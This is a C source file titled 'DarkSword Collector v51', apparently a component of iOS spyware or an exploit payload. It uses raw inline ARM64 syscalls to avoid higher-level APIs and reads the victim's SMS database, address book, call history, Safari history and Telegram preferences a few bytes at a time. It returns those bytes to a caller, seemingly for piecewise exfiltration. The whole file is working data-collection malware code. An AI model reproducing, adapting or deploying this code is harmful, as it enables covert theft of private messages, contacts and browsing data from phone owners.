/**
 * DarkSword Collector v51 - Simple file read (proven v34 approach)
 * No sysctl, no dlsym, no Mach traps - just raw BSD syscalls
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory"); return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b; register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory"); return x0;
}

#define SYS_open 5
#define SYS_read 3
#define SYS_close 6
#define O_RDONLY 0

static volatile int g_offset = 0;

int ds_start(void) {
    static const char *files[] = {
        "/etc/hosts",
        "/var/mobile/Library/Preferences/.GlobalPreferences.plist",
        "/var/mobile/Library/Preferences/ph.telegra.Telegraph.plist",
        "/var/mobile/Library/SMS/sms.db",
        "/var/mobile/Library/AddressBook/AddressBook.sqlitedb",
        "/var/mobile/Library/CallHistoryDB/CallHistory.storedata",
        "/var/mobile/Library/Safari/History.db"
    };
    int num_files = 7;
    int chunk_size = 20; /* bytes per file per call */
    
    int off = g_offset;
    int fid = off / chunk_size;
    int byte_idx = off % chunk_size;
    
    if (fid >= num_files) { g_offset = 0; return 0xFFFFFFFF; } /* Done */
    
    /* Read 1 byte from file at current offset */
    long fd = _svc1(SYS_open, (long)files[fid]);
    if (fd < 0) {
        g_offset = (fid + 1) * chunk_size; /* skip to next file */
        return 0xFE000000 | fid; /* open failed */
    }
    
    /* Seek to byte_idx by reading and discarding */
    unsigned char buf[1] = {0};
    for (int i = 0; i < byte_idx; i++) {
        _svc3(SYS_read, fd, (long)buf, 1);
    }
    
    /* Read 4 bytes */
    unsigned char data[4] = {0};
    long n = _svc3(SYS_read, fd, (long)data, 4);
    _svc1(SYS_close, fd);
    
    g_offset = off + 4; /* advance by 4 bytes */
    
    if (n <= 0) {
        /* EOF or error - move to next file */
        g_offset = (fid + 1) * chunk_size;
        return 0xEE000000 | fid; /* EOF */
    }
    
    /* Check if we've read enough for this file */
    if (byte_idx + 4 >= chunk_size) {
        g_offset = (fid + 1) * chunk_size; /* move to next file */
    }
    
    return (int)data[0] | ((int)data[1] << 8) | ((int)data[2] << 16) | ((int)data[3] << 24);
}
